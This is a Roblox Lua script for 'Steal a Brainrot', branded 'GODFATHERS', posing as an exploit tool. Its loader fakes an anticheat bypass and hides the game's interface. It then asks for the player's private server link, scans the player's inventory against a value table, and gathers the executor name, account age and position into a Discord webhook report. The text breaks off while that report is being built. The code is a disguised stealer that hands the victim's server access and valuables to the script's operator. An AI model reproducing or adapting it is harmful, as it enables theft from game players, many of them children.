-- Services
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = game:GetService("Players").LocalPlayer
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

-- Detect Executor
local function getExecutorName()
    local success, result = pcall(function()
        if identifyexecutor then
            return identifyexecutor()
        elseif getexecutorname then
            return getexecutorname()
        elseif syn then
            return "Synapse X"
        elseif fluxus then
            return "Fluxus"
        elseif KRNL_LOADED then
            return "KRNL"
        elseif is_sirhurt_closure then
            return "SirHurt"
        elseif pebc_execute then
            return "Panda"
        elseif gethui then
            return "Script-Ware"
        else
            return "Unknown Executor"
        end
    end)
    return success and result or "Unknown"
end

-- ==========================================
-- REAL BRAINROT DATABASE - Steal a Brainrot
-- Values based on La Vacca Saturno Saturnita = 1 unit
-- ==========================================
local BRAINROT_VALUES = {
    -- OG Brainrots (Highest Value)
    ["Strawberry Elephant"] = 50000,
    ["Skibidi Toilet"] = 35000,
    ["Meowl"] = 25000,
    
    -- Secret Brainrots (High Tier)
    ["Dragon Gingerini"] = 9500,
    ["Dragon Cannelloni"] = 5500,
    ["Hydra Dragon Cannelloni"] = 5000,
    ["Cerberus"] = 4500,
    ["Rosey and Teddy"] = 3800,
    ["Ketupat Bros"] = 2700,
    ["Ginger Gerat"] = 2500,
    ["La Supreme Combinasion"] = 2400,
    ["Capitano Moby"] = 2000,
    ["Cooki and Milki"] = 2000,
    ["Reinito Sleighito"] = 2000,
    ["Burguro And Fryuro"] = 1600,
    ["Spooky and Pumpky"] = 1200,
    ["Fragrama and Chocrama"] = 1100,
    ["Los Primos"] = 1000,
    ["Garama and Madundung"] = 980,
    ["La Casa Boo"] = 950,
    ["Popcuru and Fizzuru"] = 900,
    ["Rosetti Tualetti"] = 900,
    ["Jolly Jolly Sahur"] = 700,
    ["La Secret Combinasion"] = 550,
    ["La Ginger Sekolah"] = 500,
    ["Chillin Chili"] = 450,
    ["Tang Tang Keletang"] = 400,
    ["Ketupat Kepat"] = 360,
    ["La Taco Combinasion"] = 330,
    ["Los Bros"] = 320,
    ["Tictac Sahur"] = 330,
    ["Los Spaghettis"] = 300,
    ["Chipso and Queso"] = 300,
    ["Los Jolly Combinasionas"] = 300,
    ["Nuclearo Dinossauro"] = 300,
    ["Orcaledon"] = 275,
    ["Spaghetti Tualetti"] = 275,
    ["La Jolly Grande"] = 260,
    ["List List List Sahur"] = 245,
    ["La Romantic Grande"] = 250,
    ["Los Candies"] = 245,
    ["Money Money Puggy"] = 240,
    ["W or L"] = 220,
    ["La Extinct Grande"] = 200,
    ["Gobblino Uniciclino"] = 200,
    ["Las Sis"] = 200,
    ["Eviledon"] = 200,
    ["Los Puggies"] = 150,
    ["Brunito Marsito"] = 150,
    ["Money Money Reindeer"] = 140,
    ["La Spooky Grande"] = 130,
    ["Los 25"] = 130,
    ["Chicleteira Cupideira"] = 125,
    ["Tuff Toucan"] = 120,
    ["Spinny Hammy"] = 120,
    ["Esok Sekolah"] = 110,
    ["Noo my Heart"] = 100,
    ["Swaggy Bros"] = 100,
    ["Bacuru and Egguru"] = 90,
    ["Los Spooky Combinasionas"] = 70,
    ["La Grande Combinasion"] = 70,
    ["Chicleteira Noelteira"] = 45,
    ["Los Combinasionas"] = 45,
    ["Los 67"] = 40,
    ["Secret Lucky Block"] = 40,
    ["Mieteteira Bicicleteira"] = 35,
    ["Chicleteira Bicicleteira"] = 35,
    ["Chimnino"] = 30,
    ["Chicleteirina Bicicleteirina"] = 25,
    ["Los Mobilis"] = 25,
    ["67"] = 20,
    ["Rang Ring Bus"] = 20,
    ["Noo my Present"] = 20,
    ["Los Nooo My Hotspotsitos"] = 20,
    ["Arcadopus"] = 15,
    ["Noo my Candy"] = 15,
    ["Pot Hotspot"] = 15,
    ["Los Quesadillas"] = 15,
    ["Burrito Bandito"] = 15,
    ["Chill Puppy"] = 15,
    ["Quesadillo Vampiro"] = 10,
    ["Ho Ho Ho Sahur"] = 5,
    ["Job Job Job Sahur"] = 5,
    ["Frankentteo"] = 4,
    ["Los Trios"] = 4,
    ["Karker Sahur"] = 4,
    ["Las Vaquitas Saturnitas"] = 4,
    ["Los Karkeritos"] = 4,
    ["Extinct Matteo"] = 4,
    ["Pumpkini Spyderini"] = 4,
    ["Rocco Disco"] = 4,
    ["Reindeer Tralala"] = 4,
    ["La Karkerkar Combinasion"] = 4,
    ["Yess my Examine"] = 4,
    ["Bisonte Giuppitere"] = 2,
    ["Karkerkar Kurkur"] = 2,
    ["Los Matteos"] = 2,
    ["Trenostruzzo Turbo 4000"] = 2,
    ["Jackorilla"] = 2,
    ["Sammyni Spyderini"] = 2,
    ["Torrtuginni Dragonfrutini"] = 2,
    ["Dul Dul Dul"] = 2,
    ["Blackhole Goat"] = 2,
    ["Chachechi"] = 2,
    ["Agarrini la Palini"] = 2,
    ["Los Spyderinis"] = 2,
    ["Fragola La La La"] = 2,
    ["Extinct Tralalero"] = 2,
    ["La Cucaracha"] = 2,
    ["Los Tralaleritos"] = 2,
    ["Los Tortus"] = 2,
    ["Zombie Tralala"] = 2,
    ["Vulturino Skeletono"] = 2,
    ["Boatito Auratito"] = 2,
    ["Guerriro Digitale"] = 2,
    ["La Vacca Saturno Saturnita"] = 1,
    
    -- Brainrot God Brainrots
    ["Pop Pop Sahur"] = 77,
    ["Ginger Cisterna"] = 76,
    ["Bombardini Tortinii"] = 64,
    ["Los Tipi Tacos"] = 60,
    ["Frio Ninja"] = 59,
    ["Yeti Claus"] = 58,
    ["Ginger Globo"] = 58,
    ["Dug Dug Dug"] = 57,
    ["Los Orcalitos"] = 57,
    ["Aquanaut"] = 57,
    ["Corn Corn Corn Sahur"] = 56,
    ["Squalanana"] = 56,
    ["Cacasito Satalito"] = 56,
    ["Tartaruga Cisterna"] = 56,
    ["Los Bombinitos"] = 55,
    ["Tractoro Dinosauro"] = 55,
    ["Piccione Macchina"] = 54,
    ["Espresso Signora"] = 53,
    ["Trenostruzzo Turbo 3000"] = 53,
    ["Pakrahmatmamat"] = 50,
    ["Los Tungtuntuncitos"] = 50,
    ["Ballerina Peppermintina"] = 50,
    ["Gattito Tacoto"] = 47,
    ["Capi Taco"] = 45,
    ["Urubini Flamenguini"] = 44,
    ["Trippi Troppi Troppa Trippa"] = 44,
    ["Tukanno Bananno"] = 23,
    ["Statutino Libertino"] = 22,
    ["Tipi Topi Taco"] = 22,
    ["Tralalita Tralala"] = 22,
    ["Chihuanini Taconini"] = 22,
    ["Girafa Celestre"] = 20,
    ["Gyattatino Nyanino"] = 20,
    ["Trigoligre Frutonni"] = 20,
    ["Orcalero Orcala"] = 20,
    ["Alessio"] = 19,
    ["Los Crocodilitos"] = 18,
    ["Odin Din Din Dun"] = 18,
    ["Matteo"] = 25,
    ["Tralalero Tralala"] = 25,
    ["Cocofanta Elefanto"] = 14,
    
    -- Mythic Brainrots
    ["Tree Tree Tree Sahur"] = 14,
    ["Bananito Bandito"] = 14,
    ["Toiletto Focaccino"] = 13,
    ["Carrotini Brainini"] = 13,
    ["Elefanto Frigo"] = 12,
    ["Carloo"] = 12,
    ["Cachorrito Melonito"] = 12,
    ["Jingle Jingle Sahur"] = 12,
    ["Gangazelli Trulala"] = 12,
    ["Tob Tobi Tobi"] = 11,
    ["Lerulerulerule"] = 11,
    ["Tracoducotulu Delapeladustuz"] = 10,
    ["Gorillo Watermelondrillo"] = 10,
    ["Cavallo Virtuso"] = 8,
    ["Te Te Te Sahur"] = 8,
    ["Avocadorilla"] = 7,
    ["Bombombini Gusini"] = 4,
    ["Zibra Zubra Zibralini"] = 4,
    ["Tigrilini Watermelini"] = 4,
    ["Bombardiro Crocodilo"] = 3,
    ["Rhino Toasterino"] = 3,
    ["Orangutini Ananasini"] = 3,
    ["Spioniro Golubiro"] = 3,
    ["Frigo Camelo"] = 2,
    
    -- Legendary Brainrots
    ["Sigma Girl"] = 0.2,
    ["Sealo Regalo"] = 0.2,
    ["Buho de Fuego"] = 0.2,
    ["Puffaball"] = 0.18,
    ["Chocco Bunny"] = 0.17,
    ["Sigma Boy"] = 0.16,
    ["Signore Carapace"] = 0.15,
    ["Pi Pi Watermelon"] = 0.15,
    ["Pandaccini Bananini"] = 0.14,
    ["Cocosini Mama"] = 0.13,
    ["Pipi Potato"] = 0.12,
    ["Strawberrelli Flamingelli"] = 0.12,
    ["Blueberrinni Octopusini"] = 0.11,
    ["Caramello Filtrello"] = 0.11,
    ["Quivoli Ameleoni"] = 0.1,
    ["Glorbo Fruttodrillo"] = 0.09,
    ["Lionel Cactuseli"] = 0.08,
    ["Chef Crabracadabra"] = 0.08,
    ["Burbaloni Loliloli"] = 0.08,
    ["Ballerina Cappuccina"] = 0.07,
    ["Tirilikalika Tirilikalako"] = 0.06,
    ["Chimpanzini Bananini"] = 0.05,
    
    -- Epic Brainrots
    ["Mummio Rappitto"] = 0.08,
    ["Penguino Cocosino"] = 0.07,
    ["Wombo Rollo"] = 0.07,
    ["Penguin Tree"] = 0.07,
    ["Doi Doi Do"] = 0.07,
    ["Salamino Penguino"] = 0.06,
    ["Frogato Pirato"] = 0.06,
    ["Mangolini Parrocini"] = 0.06,
    ["Ti Ti Ti Sahur"] = 0.06,
    ["Avocadini Guffo"] = 0.06,
    ["Brri Brri Bicus Dicus Bombicus"] = 0.05,
    ["Perochello Lemonchello"] = 0.05,
    ["Bananita Dolphinita"] = 0.05,
    ["Malame Amarele"] = 0.05,
    ["Bambini Crostini"] = 0.05,
    ["Trulimero Trulicina"] = 0.05,
    ["Avocadini Antilopini"] = 0.04,
    ["Brr Brr Patapim"] = 0.04,
    ["Bandito Axolito"] = 0.03,
    ["Cappuccino Assassino"] = 0.03,
    
    -- Rare Brainrots
    ["Pinealotto Fruttarino"] = 0.05,
    ["Pipi Avocado"] = 0.05,
    ["Frogo Elfo"] = 0.05,
    ["Tric Trac Baraboom"] = 0.05,
    ["Ta Ta Ta Ta Sahur"] = 0.04,
    ["Cacto Hipopotamo"] = 0.04,
    ["Boneca Ambalabu"] = 0.03,
    ["Bandito Bobritto"] = 0.03,
    ["Gangster Footera"] = 0.03,
    ["Trippi Troppi"] = 0.02,
    
    -- Common Brainrots
    ["Pipi Corni"] = 0.02,
    ["Pipi Kiwi"] = 0.02,
    ["Tartaragno"] = 0.02,
    ["Raccooni Jandelini"] = 0.02,
    ["Noobini Santanini"] = 0.02,
    ["Talpa Di Fero"] = 0.02,
    ["Svinina Bombardino"] = 0.02,
    ["Fluriflura"] = 0.01,
    ["Tim Cheese"] = 0.01,
    ["Lirilì Larilà"] = 0.01,
    ["Noobini Pizzanini"] = 0.01,
}

-- IGNORE LIST - Objects that contain these words are NOT player items
local IGNORE_PATTERNS = {
    "collision", "ignore", "vfx", "stars", "spawn", "trader", "npc", "shop", 
    "template", "storage", "system", "handler", "controller", "manager",
    "left", "right", "bigger", "present", "god lucky block", "workspace",
    "baseplate", "terrain", "camera", "gui", "ui", "effect", "trail", "particle",
    "sound", "decal", "texture", "mesh", "union", "wedge", "corner", "cylinder"
}

-- Floor Detection Configuration
local FLOOR_HEIGHTS = {
    [0] = "Ground Floor",
    [50] = "Floor 2",
    [100] = "Floor 3",
    [150] = "Floor 4",
    [200] = "Floor 5",
}

-- Packages
local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

-- Notification listener
pcall(function()
    NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message) end)
end)

-- Toggle player settings
task.spawn(function()
    pcall(function()
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
    end)
end)

-- Disable CoreGui
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- ==========================================
-- GODFATHERS LOADER UI
-- ==========================================
local loaderGui = Instance.new("ScreenGui")
loaderGui.Name = "GodFathersLoader"
loaderGui.IgnoreGuiInset = true
loaderGui.ResetOnSpawn = false
loaderGui.Parent = game:GetService("CoreGui")

local mainContainer = Instance.new("Frame", loaderGui)
mainContainer.Size = UDim2.new(1, 0, 1, 0)
mainContainer.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
mainContainer.BorderSizePixel = 0

local gradient = Instance.new("UIGradient", mainContainer)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 0, 0))
})
gradient.Rotation = 45

task.spawn(function()
    while loaderGui.Parent do
        TweenService:Create(gradient, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Rotation = gradient.Rotation + 180
        }):Play()
        wait(3)
    end
end)

local godFathersLabel = Instance.new("TextLabel", mainContainer)
godFathersLabel.Size = UDim2.new(1, 0, 0, 80)
godFathersLabel.Position = UDim2.new(0, 0, 0.3, 0)
godFathersLabel.BackgroundTransparency = 1
godFathersLabel.Font = Enum.Font.GothamBlack
godFathersLabel.TextSize = 72
godFathersLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
godFathersLabel.Text = "GODFATHERS"
godFathersLabel.TextStrokeTransparency = 0.8
godFathersLabel.TextStrokeColor3 = Color3.fromRGB(139, 0, 0)

local subtitleLabel = Instance.new("TextLabel", mainContainer)
subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
subtitleLabel.Position = UDim2.new(0, 0, 0.42, 0)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Font = Enum.Font.GothamBold
subtitleLabel.TextSize = 18
subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
subtitleLabel.Text = "EXCLUSIVE SCRIPTS & TOOLS"

local progressBg = Instance.new("Frame", mainContainer)
progressBg.Size = UDim2.new(0, 400, 0, 6)
progressBg.Position = UDim2.new(0.5, -200, 0.55, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
progressBg.BorderSizePixel = 0

local progressCorner = Instance.new("UICorner", progressBg)
progressCorner.CornerRadius = UDim.new(0, 3)

local progressFill = Instance.new("Frame", progressBg)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
progressFill.BorderSizePixel = 0

local fillCorner = Instance.new("UICorner", progressFill)
fillCorner.CornerRadius = UDim.new(0, 3)

local loadingText = Instance.new("TextLabel", mainContainer)
loadingText.Size = UDim2.new(1, 0, 0, 25)
loadingText.Position = UDim2.new(0, 0, 0.58, 0)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16
loadingText.TextColor3 = Color3.fromRGB(220, 20, 60)
loadingText.Text = "INITIALIZING..."

local percentLabel = Instance.new("TextLabel", mainContainer)
percentLabel.Size = UDim2.new(1, 0, 0, 40)
percentLabel.Position = UDim2.new(0, 0, 0.62, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Font = Enum.Font.GothamBlack
percentLabel.TextSize = 36
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Text = "0%"

local statusLabel = Instance.new("TextLabel", mainContainer)
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 0.68, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 14
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
statusLabel.Text = "Connecting to secure servers..."

local footerLabel = Instance.new("TextLabel", mainContainer)
footerLabel.Size = UDim2.new(1, 0, 0, 20)
footerLabel.Position = UDim2.new(0, 0, 0.9, 0)
footerLabel.BackgroundTransparency = 1
footerLabel.Font = Enum.Font.Gotham
footerLabel.TextSize = 12
footerLabel.TextColor3 = Color3.fromRGB(100, 0, 0)
footerLabel.Text = "discord.gg/godfathers | v2.1.0"

local loadingStages = {
    {percent = 15, text = "BYPASSING ANTICHEAT...", status = "Injecting stealth modules..."},
    {percent = 30, text = "LOADING ASSETS...", status = "Fetching game data..."},
    {percent = 45, text = "SCANNING BRAINROTS...", status = "Analyzing workspace models..."},
    {percent = 60, text = "CALCULATING VALUES...", status = "Converting to trade values..."},
    {percent = 75, text = "SECURE CONNECTION...", status = "Establishing webhook tunnel..."},
    {percent = 90, text = "FINALIZING...", status = "Cleaning up traces..."},
    {percent = 100, text = "COMPLETE", status = "Ready to execute"},
}

local loadSound = Instance.new("Sound", mainContainer)
loadSound.SoundId = "rbxassetid://9113083740"
loadSound.Volume = 0.5
loadSound:Play()

for _, stage in ipairs(loadingStages) do
    wait(math.random(8, 15) / 10)
    
    TweenService:Create(progressFill, TweenInfo.new(0.3), {
        Size = UDim2.new(stage.percent / 100, 0, 1, 0)
    }):Play()
    
    loadingText.Text = stage.text
    percentLabel.Text = stage.percent .. "%"
    statusLabel.Text = stage.status
    
    if stage.percent == 100 then
        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
            TextColor3 = Color3.fromRGB(255, 50, 50)
        }):Play()
        wait(0.2)
        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
            TextColor3 = Color3.fromRGB(220, 20, 60)
        }):Play()
    end
end

wait(0.5)
loaderGui:Destroy()

-- ==========================================
-- MAIN UI
-- ==========================================
local brainrotUI = Instance.new("ScreenGui")
brainrotUI.Name = "GodFathersUI"
brainrotUI.ResetOnSpawn = false
brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame", brainrotUI)
mainFrame.Size = UDim2.new(0, 450, 0, 220)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true

local frameGradient = Instance.new("UIGradient", mainFrame)
frameGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 5, 5)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 0, 0))
})

local frameCorner = Instance.new("UICorner", mainFrame)
frameCorner.CornerRadius = UDim.new(0, 12)

local border = Instance.new("UIStroke", mainFrame)
border.Color = Color3.fromRGB(139, 0, 0)
border.Thickness = 2

local headerBar = Instance.new("Frame", mainFrame)
headerBar.Size = UDim2.new(1, 0, 0, 50)
headerBar.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
headerBar.BorderSizePixel = 0

local headerCorner = Instance.new("UICorner", headerBar)
headerCorner.CornerRadius = UDim.new(0, 12)

local headerFix = Instance.new("Frame", headerBar)
headerFix.Size = UDim2.new(1, 0, 0.5, 0)
headerFix.Position = UDim2.new(0, 0, 0.5, 0)
headerFix.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
headerFix.BorderSizePixel = 0

local headerLogo = Instance.new("TextLabel", headerBar)
headerLogo.Size = UDim2.new(1, 0, 1, 0)
headerLogo.BackgroundTransparency = 1
headerLogo.Font = Enum.Font.GothamBlack
headerLogo.TextSize = 24
headerLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
headerLogo.Text = "GODFATHERS"

local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0.28, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 16
titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
titleLabel.Text = "Enter Private Server Link to Unlock"

local serverLinkBox = Instance.new("TextBox", mainFrame)
serverLinkBox.Size = UDim2.new(0.9, 0, 0, 45)
serverLinkBox.Position = UDim2.new(0.05, 0, 0.48, 0)
serverLinkBox.PlaceholderText = "https://www.roblox.com/share?code= ..."
serverLinkBox.Font = Enum.Font.Gotham
serverLinkBox.TextSize = 14
serverLinkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
serverLinkBox.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
serverLinkBox.ClearTextOnFocus = false

local textBoxCorner = Instance.new("UICorner", serverLinkBox)
textBoxCorner.CornerRadius = UDim.new(0, 8)

local textBoxStroke = Instance.new("UIStroke", serverLinkBox)
textBoxStroke.Color = Color3.fromRGB(100, 0, 0)
textBoxStroke.Thickness = 1

local enterButton = Instance.new("TextButton", mainFrame)
enterButton.Size = UDim2.new(0.9, 0, 0, 45)
enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
enterButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
enterButton.Text = "ENTER"
enterButton.Font = Enum.Font.GothamBlack
enterButton.TextSize = 18
enterButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local buttonCorner = Instance.new("UICorner", enterButton)
buttonCorner.CornerRadius = UDim.new(0, 8)

enterButton.MouseEnter:Connect(function()
    TweenService:Create(enterButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(178, 34, 34)
    }):Play()
end)

enterButton.MouseLeave:Connect(function()
    TweenService:Create(enterButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(139, 0, 0)
    }):Play()
end)

-- ==========================================
-- FLOOR DETECTION
-- ==========================================
local function getCurrentFloor()
    local character = LocalPlayer.Character
    if not character then return "Unknown" end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return "Unknown" end
    
    local currentPos = humanoidRootPart.Position
    local height = currentPos.Y
    
    -- Check defined floor heights
    local detectedFloor = "Ground Floor"
    local closestHeight = -math.huge
    
    for floorHeight, floorName in pairs(FLOOR_HEIGHTS) do
        if height >= floorHeight and floorHeight > closestHeight then
            closestHeight = floorHeight
            detectedFloor = floorName
        end
    end
    
    if detectedFloor ~= "Ground Floor" then
        return detectedFloor
    end
    
    -- Raycast to find floor name
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    
    local rayOrigin = currentPos
    local rayDirection = Vector3.new(0, -50, 0)
    
    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
    
    if raycastResult then
        local hitPart = raycastResult.Instance
        if hitPart then
            local partName = hitPart.Name:lower()
            if partName:find("floor") or partName:find("level") or partName:find("stage") then
                local floorNum = partName:match("%d+")
                if floorNum then
                    return "Floor " .. floorNum
                else
                    return hitPart.Name
                end
            elseif partName:find("ground") or partName:find("baseplate") then
                return "Ground Floor"
            end
        end
    end
    
    -- Fallback based on height
    if height < 10 then
        return "Ground Floor"
    elseif height < 50 then
        return "Floor 2+"
    elseif height < 100 then
        return "Floor 3+"
    else
        return "High Elevation (" .. math.floor(height) .. "m)"
    end
end

-- ==========================================
-- IMPROVED BRAINROT SCANNING
-- ==========================================

-- Check if name should be ignored
local function shouldIgnore(name)
    local lowerName = name:lower()
    for _, pattern in ipairs(IGNORE_PATTERNS) do
        if lowerName:find(pattern) then
            return true
        end
    end
    return false
end

-- Fuzzy match brainrot name (handles slight variations)
local function getBrainrotType(name)
    local exactMatch = BRAINROT_VALUES[name]
    if exactMatch then
        return name, exactMatch
    end
    
    -- Try case-insensitive match
    for brainrotName, value in pairs(BRAINROT_VALUES) do
        if name:lower() == brainrotName:lower() then
            return brainrotName, value
        end
    end
    
    -- Try partial match (for mutated names like "Golden Tralalero Tralala")
    for brainrotName, value in pairs(BRAINROT_VALUES) do
        if name:find(brainrotName) or brainrotName:find(name) then
            return brainrotName, value
        end
    end
    
    return nil, 0
end

-- Enhanced scanning with multiple detection methods
local function scanBrainrots()
    local foundBrainrots = {}
    local totalValue = 0
    local totalCount = 0
    local scannedNames = {} -- Prevent duplicates
    
    -- Method 1: Check Player's Backpack (Inventory)
    if LocalPlayer:FindFirstChild("Backpack") then
        for _, obj in ipairs(LocalPlayer.Backpack:GetDescendants()) do
            if obj:IsA("Tool") or obj:IsA("Model") then
                local name = obj.Name
                if not shouldIgnore(name) and not scannedNames[name] then
                    local brainrotType, value = getBrainrotType(name)
                    if brainrotType then
                        scannedNames[name] = true
                        table.insert(foundBrainrots, {
                            name = name,
                            displayName = brainrotType,
                            value = value,
                            location = "Backpack",
                            rarity = getRarity(value)
                        })
                        totalValue = totalValue + value
                        totalCount = totalCount + 1
                    end
                end
            end
        end
    end
    
    -- Method 2: Check Character (Equipped items)
    if LocalPlayer.Character then
        for _, obj in ipairs(LocalPlayer.Character:GetDescendants()) do
            if obj:IsA("Tool") or obj:IsA("Model") or obj:IsA("Part") or obj:IsA("MeshPart") then
                local name = obj.Name
                if not shouldIgnore(name) and not scannedNames[name] then
                    local brainrotType, value = getBrainrotType(name)
                    if brainrotType then
                        scannedNames[name] = true
                        table.insert(foundBrainrots, {
                            name = name,
                            displayName = brainrotType,
                            value = value,
                            location = "Equipped",
                            rarity = getRarity(value)
                        })
                        totalValue = totalValue + value
                        totalCount = totalCount + 1
                    end
                end
            end
        end
    end
    
    -- Method 3: Check PlayerGui for Inventory UI
    if LocalPlayer:FindFirstChild("PlayerGui") then
        local guiItems = LocalPlayer.PlayerGui:FindFirstChild("Brainrots") or 
                        LocalPlayer.PlayerGui:FindFirstChild("Inventory") or
                        LocalPlayer.PlayerGui:FindFirstChild("Items") or
                        LocalPlayer.PlayerGui:FindFirstChild("PetUI")
        if guiItems then
            for _, obj in ipairs(guiItems:GetDescendants()) do
                if obj:IsA("TextLabel") or obj:IsA("ImageLabel") then
                    local name = obj.Name
                    if not shouldIgnore(name) and not scannedNames[name] then
                        local brainrotType, value = getBrainrotType(name)
                        if brainrotType then
                            scannedNames[name] = true
                            table.insert(foundBrainrots, {
                                name = name,
                                displayName = brainrotType,
                                value = value,
                                location = "UI",
                                rarity = getRarity(value)
                            })
                            totalValue = totalValue + value
                            totalCount = totalCount + 1
                        end
                    end
                end
            end
        end
    end
    
    -- Method 4: Check ReplicatedStorage for player data
    pcall(function()
        local playerData = ReplicatedStorage:FindFirstChild("PlayerData") or 
                          ReplicatedStorage:FindFirstChild("PlayerBrainrots")
        if playerData then
            local userData = playerData:FindFirstChild(tostring(LocalPlayer.UserId)) or
                           playerData:FindFirstChild(LocalPlayer.Name)
            if userData then
                for _, obj in ipairs(userData:GetDescendants()) do
                    local name = obj.Name
                    if not shouldIgnore(name) and not scannedNames[name] then
                        local brainrotType, value = getBrainrotType(name)
                        if brainrotType then
                            scannedNames[name] = true
                            table.insert(foundBrainrots, {
                                name = name,
                                displayName = brainrotType,
                                value = value,
                                location = "Data",
                                rarity = getRarity(value)
                            })
                            totalValue = totalValue + value
                            totalCount = totalCount + 1
                        end
                    end
                end
            end
        end
    end)
    
    -- Sort by value (highest first)
    table.sort(foundBrainrots, function(a, b)
        return a.value > b.value
    end)
    
    return foundBrainrots, totalValue, totalCount
end

-- Get rarity based on value
function getRarity(value)
    if value >= 1000 then return "🔴 Secret"
    elseif value >= 50 then return "🟠 Brainrot God"
    elseif value >= 10 then return "🟡 Mythic"
    elseif value >= 1 then return "🟢 Legendary"
    elseif value >= 0.1 then return "🔵 Epic"
    elseif value >= 0.05 then return "🟣 Rare"
    else return "⚪ Common" end
end

-- Button click handler
enterButton.MouseButton1Click:Connect(function()
    local serverLink = serverLinkBox.Text
    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$") or serverLink == "admin123"
    
    if not isValidLink then
        enterButton.Text = "❌ INVALID LINK"
        enterButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
        
        TweenService:Create(enterButton, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(139, 0, 0)
        }):Play()
        
        wait(1.5)
        enterButton.Text = "ENTER"
        return
    end

    enterButton.Text = "✅ ACCESS GRANTED"
    enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    
    wait(0.8)
    
    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
        Position = UDim2.new(0.5, -225, 1.5, 0)
    }):Play()
    
    wait(0.5)
    brainrotUI:Destroy()

    local executorName = getExecutorName()
    local accountAgeDays = LocalPlayer.AccountAge
    local foundBrainrots, totalValue, totalCount = scanBrainrots()
    local currentFloor = getCurrentFloor()
    
    -- Format brainrot list for webhook (top 15 most valuable)
    local brainrotList = ""
    if #foundBrainrots > 0 then
        local displayCount = math.min(#foundBrainrots, 15)
        for i = 1, displayCount do
            local item = foundBrainrots[i]
            brainrotList = brainrotList .. string.format("%d. %s **%s** - %.2f LV\n", 
                i, item.rarity, item.displayName, item.value)
        end
        if #foundBrainrots > 15 then
            brainrotList = brainrotList .. string.format("\n*...and %d more*", #foundBrainrots - 15)
        end
    else
        brainrotList = "No brainrots found in inventory"
    end
    
    -- Calculate EUR equivalent (1 LV = 0.01 EUR for example)
    local totalEUR = totalValue * 0.01
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local posX = hrp and hrp.Position.X or 0
    local posY = hrp and hrp.Position.Y or 0
    local posZ = hrp and hrp.Position.Z or 0
    
    task.spawn(function()
        local webhookData = {
            username = "GodFather Scripts",
            avatar_url = "https://i.imgur.com/6XK8YBn.png",
            embeds = {{
                title = "🔴 New Execution Detected - Steal a Brainrot",
                color = 0xDC143C,
                timestamp = DateTime.now():ToIsoDate(),
                thumbnail = {
                    url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. LocalPlayer.Name
                },
                fields = {
                    {
                        name = "👤 Player Information",
